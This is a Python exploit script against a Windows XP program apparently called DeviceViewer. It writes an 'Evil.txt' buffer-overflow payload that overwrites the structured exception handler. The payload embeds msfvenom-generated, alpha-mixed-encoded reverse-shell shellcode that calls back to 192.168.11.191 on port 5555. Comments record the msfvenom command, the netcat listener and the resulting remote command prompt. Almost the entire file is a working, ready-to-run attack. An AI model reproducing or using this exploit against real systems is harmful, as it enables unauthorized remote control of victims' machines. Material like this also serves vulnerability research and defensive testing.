#!/usr/bin/python
#Pass the content into the USER TEXTBOX
#Author : Win Sam
#
#root@kali:~# nc -nvlp 5555
#listening on [any] 5555 ...
#connect to [192.168.11.191] from (UNKNOWN) [192.168.11.177] 1098
#Microsoft Windows XP [Version 5.1.2600]
#(C) Copyright 1985-2001 Microsoft Corp.
#
#C:\Program Files\DeviceViewer>

#6AE810B4   5B               POP EBX
#6AE810B5   5D               POP EBP
#6AE810B6   C3               RETN


#root@kali:~# msfvenom -p windows/shell_reverse_tcp lhost=192.168.11.191 lport=5555 -e x86/alpha_mixed -f python
#[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
#[-] No arch selected, selecting arch: x86 from the payload
#Found 1 compatible encoders
#Attempting to encode payload with 1 iterations of x86/alpha_mixed
#x86/alpha_mixed succeeded with size 710 (iteration=0)
#x86/alpha_mixed chosen with final size 710
#Payload size: 710 bytes
#Final size of python file: 3400 bytes
buf =  ""
buf += "\x89\xe3\xdb\xc4\xd9\x73\xf4\x5f\x57\x59\x49\x49\x49"
buf += "\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
buf += "\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
buf += "\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
buf += "\x58\x50\x38\x41\x42\x75\x4a\x49\x6b\x4c\x6a\x48\x4f"
buf += "\x72\x47\x70\x53\x30\x63\x30\x53\x50\x6b\x39\x59\x75"
buf += "\x56\x51\x49\x50\x65\x34\x6e\x6b\x32\x70\x64\x70\x6c"
buf += "\x4b\x70\x52\x36\x6c\x4e\x6b\x70\x52\x42\x34\x4e\x6b"
buf += "\x70\x72\x57\x58\x76\x6f\x4e\x57\x62\x6a\x34\x66\x55"
buf += "\x61\x69\x6f\x6c\x6c\x77\x4c\x45\x31\x71\x6c\x56\x62"
buf += "\x44\x6c\x45\x70\x6a\x61\x58\x4f\x34\x4d\x77\x71\x68"
buf += "\x47\x58\x62\x4a\x52\x33\x62\x61\x47\x6c\x4b\x30\x52"
buf += "\x74\x50\x6c\x4b\x61\x5a\x77\x4c\x4e\x6b\x72\x6c\x44"
buf += "\x51\x52\x58\x58\x63\x31\x58\x77\x71\x6e\x31\x32\x71"
buf += "\x4c\x4b\x31\x49\x55\x70\x73\x31\x7a\x73\x6c\x4b\x52"
buf += "\x69\x42\x38\x78\x63\x47\x4a\x71\x59\x6c\x4b\x35\x64"
buf += "\x4e\x6b\x65\x51\x49\x46\x74\x71\x4b\x4f\x4c\x6c\x5a"
buf += "\x61\x5a\x6f\x36\x6d\x57\x71\x39\x57\x54\x78\x79\x70"
buf += "\x32\x55\x69\x66\x47\x73\x31\x6d\x38\x78\x65\x6b\x33"
buf += "\x4d\x74\x64\x31\x65\x69\x74\x31\x48\x6e\x6b\x33\x68"
buf += "\x76\x44\x46\x61\x39\x43\x71\x76\x6e\x6b\x56\x6c\x62"
buf += "\x6b\x6c\x4b\x76\x38\x45\x4c\x73\x31\x78\x53\x4c\x4b"
buf += "\x44\x44\x4c\x4b\x75\x51\x7a\x70\x6f\x79\x71\x54\x35"
buf += "\x74\x31\x34\x73\x6b\x31\x4b\x43\x51\x76\x39\x72\x7a"
buf += "\x50\x51\x59\x6f\x6d\x30\x51\x4f\x63\x6f\x52\x7a\x4c"
buf += "\x4b\x56\x72\x48\x6b\x6c\x4d\x73\x6d\x73\x58\x44\x73"
buf += "\x30\x32\x35\x50\x45\x50\x71\x78\x31\x67\x33\x43\x36"
buf += "\x52\x61\x4f\x30\x54\x55\x38\x72\x6c\x52\x57\x65\x76"
buf += "\x45\x57\x39\x6f\x4e\x35\x38\x38\x7a\x30\x33\x31\x37"
buf += "\x70\x53\x30\x61\x39\x68\x44\x62\x74\x30\x50\x61\x78"
buf += "\x54\x69\x6b\x30\x70\x6b\x53\x30\x4b\x4f\x4b\x65\x56"
buf += "\x30\x32\x70\x56\x30\x36\x30\x71\x50\x50\x50\x43\x70"
buf += "\x72\x70\x71\x78\x4a\x4a\x46\x6f\x79\x4f\x4b\x50\x6b"
buf += "\x4f\x79\x45\x4a\x37\x31\x7a\x37\x75\x53\x58\x4f\x30"
buf += "\x4c\x68\x74\x4b\x6d\x6f\x51\x78\x54\x42\x45\x50\x66"
buf += "\x75\x58\x33\x6c\x49\x5a\x46\x50\x6a\x72\x30\x66\x36"
buf += "\x51\x47\x75\x38\x4c\x59\x4d\x75\x31\x64\x61\x71\x79"
buf += "\x6f\x58\x55\x4c\x45\x6f\x30\x53\x44\x74\x4c\x59\x6f"
buf += "\x70\x4e\x43\x38\x50\x75\x48\x6c\x51\x78\x48\x70\x48"
buf += "\x35\x6f\x52\x50\x56\x59\x6f\x59\x45\x52\x48\x61\x73"
buf += "\x32\x4d\x33\x54\x75\x50\x4d\x59\x58\x63\x46\x37\x52"
buf += "\x77\x36\x37\x35\x61\x59\x66\x63\x5a\x34\x52\x50\x59"
buf += "\x52\x76\x78\x62\x59\x6d\x33\x56\x6b\x77\x53\x74\x66"
buf += "\x44\x75\x6c\x76\x61\x57\x71\x6c\x4d\x62\x64\x37\x54"
buf += "\x32\x30\x78\x46\x33\x30\x63\x74\x56\x34\x30\x50\x71"
buf += "\x46\x72\x76\x43\x66\x32\x66\x70\x56\x30\x4e\x62\x76"
buf += "\x31\x46\x36\x33\x70\x56\x62\x48\x33\x49\x58\x4c\x47"
buf += "\x4f\x6c\x46\x4b\x4f\x38\x55\x6f\x79\x69\x70\x52\x6e"
buf += "\x76\x36\x62\x66\x6b\x4f\x50\x30\x55\x38\x76\x68\x6d"
buf += "\x57\x37\x6d\x71\x70\x69\x6f\x7a\x75\x6f\x4b\x58\x70"
buf += "\x78\x35\x6c\x62\x50\x56\x35\x38\x4f\x56\x4f\x65\x6d"
buf += "\x6d\x6f\x6d\x69\x6f\x59\x45\x67\x4c\x53\x36\x43\x4c"
buf += "\x74\x4a\x4d\x50\x69\x6b\x59\x70\x71\x65\x77\x75\x4f"
buf += "\x4b\x57\x37\x75\x43\x43\x42\x50\x6f\x70\x6a\x45\x50"
buf += "\x66\x33\x69\x6f\x7a\x75\x41\x41"


nseh="\xEB\x06\x90\x90"
seh ="\xB4\x10\xE8\x6A"
buffer ="A" * 264 + nseh + seh + "\x90"*16 + buf  + "D" * 6000
try:
	f=open("Evil.txt","w")
	print "[+] Creating %s bytes evil payload.." %len(buffer)
	f.write(buffer)
	f.close()
	print "[+] File created!"
except Exception as e:
	print e

